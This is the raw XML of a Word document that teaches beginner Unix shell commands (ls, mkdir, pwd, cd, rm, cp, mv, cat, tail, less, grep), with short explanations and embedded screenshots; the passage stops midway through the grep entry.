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B563AA" w14:textId="20705AB1" w:rsidR="00A9204E" w:rsidRPr="002B2A1D" w:rsidRDefault="00482630">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:u w:val="single"/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="002B2A1D">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:u w:val="single"/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve">UNIX </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="115406E7" w14:textId="5F999426" w:rsidR="00482630" w:rsidRPr="00AD72DF" w:rsidRDefault="00482630">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="0" w:name="_GoBack"/>
      <w:bookmarkEnd w:id="0"/>
    </w:p>
    <w:p w14:paraId="43547095"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ls – List</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="196FE6E3"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ls</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="333333"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> lists the contents (files and folders) of the current working directory. It’s the same as you opening a folder in file explorer to see its contents in GUI.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74F9555F" w14:textId="7D859DFF"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23EDC33A" wp14:editId="3ECA9A13">
            <wp:extent cx="4895850" cy="120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1209675"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C4D2596"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proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>mkdir</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> – Make Directory</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56A79992"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proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="333333"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>mkdir</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&lt;new-directory-name&gt;</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="333333"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> makes (or creates) a new directory. It’s the same as you using the context menu’s ‘new/create directory’ option to create a new folder (or directory) using file explorer in GUI.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="76BB6B13" w14:textId="484DEAF0"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73673C11" wp14:editId="3BA51CC8">
            <wp:extent cx="3476625" cy="1238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625" cy="1238250"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F07AD78"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proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>pwd</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> – Print Working Directory</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="349687EC"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proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="333333"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>pwd</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="333333"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> prints the current working directory.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0DE92C79" w14:textId="18E85733"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5A785AA0" wp14:editId="37E9A193">
            <wp:extent cx="2381250" cy="790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790575"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="455BD93A"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lastRenderedPageBreak/>
        <w:t>cd – Change Directory</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6FA9538B"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cd &lt;directory&gt;</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="333333"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>sets the given folder (or directory) as the current working directory for the current running session of the terminal (or bash). It’s the same as you opening a directory to do some operations using file explorer in GUI.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4DF6F4A8" w14:textId="718E5568"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56398F1B" wp14:editId="764288FD">
            <wp:extent cx="4876800" cy="1343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343025"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="16149FEF"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proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>rmdir</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> – Remove Directory</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30485191"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proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="333333"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>rmdir</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&lt;directory-name&gt;</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="333333"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> removes (or deletes) the given directory.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="616DF4ED" w14:textId="5BDFDF2B"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7933D69F" wp14:editId="6247143A">
            <wp:extent cx="3486150" cy="1257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150" cy="1257300"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="525A0C5A"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rm – Remove</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6398B3E2"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rm &lt;file-name&gt;</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="333333"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> removes the given file or folder. You can use </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="333333"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve">rm -r &lt;directory-name&gt; </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="333333"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>to delete folders recursively.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7439C11C" w14:textId="1306723E"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54BD8D78" wp14:editId="1833B72A">
            <wp:extent cx="392430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238250"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="66B25178"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lastRenderedPageBreak/>
        <w:t>cp – Copy</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61EC6400"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cp &lt;source-file&gt; &lt;destination-file&gt;</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="333333"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> copies the file or folder from one location to another location. You can use its </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="333333"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>cp -r &lt;source-folder&gt; &lt;destination-folder&gt;</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="333333"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> option to copy folders recursively.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44C5340F" w14:textId="57DD6190"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06E90A3E" wp14:editId="7E6A8781">
            <wp:extent cx="5915025" cy="1571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025" cy="1571625"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C6AF80B"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 xml:space="preserve">mv – </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>MoVe</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="0EBA9A9C"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mv &lt;source&gt; &lt;destination&gt;</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="333333"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> moves a file or folder from one location to another location. It can also act to rename the file or folder if the file or folder is in the current working directory but the file or folder has a new name.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27CA19A1" w14:textId="0D8E2F51"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353A913D" wp14:editId="7F3ACB17">
            <wp:extent cx="4914900" cy="204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2047875"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F460FDB"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cat – concatenate and print files</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0DDAFA49"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cat &lt;file&gt;</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="333333"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> concatenates and prints files on the standard output (i.e., the monitor or computer’s screen). It’s the same as you viewing contents of text files using text viewer or editor in GUI.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24C07F10" w14:textId="4402922D"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lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="22E2AB27" wp14:editId="0061D3AF">
            <wp:extent cx="4419600" cy="1876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1876425"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="07D759AA"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tail – print TAIL (from last)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B9781DB"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tail &lt;file-name&gt;</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="333333"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> prints the last 10 lines (by default) of the given file on the standard output (i.e., the computer’s screen or monitor). You can use </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="333333"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve">tail -n </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="333333"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>N</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&lt;file-name&gt;</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="333333"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> to dictate the last N number of lines to print on the screen.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E5DAA1E" w14:textId="03EBE86B"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6CCCB069" wp14:editId="5F776F0B">
            <wp:extent cx="3609975" cy="4572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9975" cy="4572000"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A54089B"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lastRenderedPageBreak/>
        <w:t>less – print LESS</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="64DAF5A0"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less &lt;file-name&gt;</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="333333"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> prints the given file page by page (or window by window). It’s useful and efficient for viewing large files containing lots of textual data that won’t fit on the screen. You can press</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>Ctrl+F</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="333333"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve">to go forward and </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>Ctrl+B</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="333333"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>to go backward by one page. It’s the same as you viewing the contents of a text file in a text viewer or editor and reading the file page by page in GUI.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F0DFABA" w14:textId="4D090BE3"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0398A3A9" wp14:editId="4AAC3F66">
            <wp:extent cx="4924425" cy="142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4425" cy="1428750"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="1658983A"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grep</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5FD496B3"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grep "&lt;string&gt;" &lt;file-name&gt;</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="333333"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> searches for a given string in a given file. You can use </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="333333"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>grep -</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="333333"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>i</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"&lt;string&gt;" &lt;file-name&gt;</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="333333"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> to make a case-insensitive search and </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
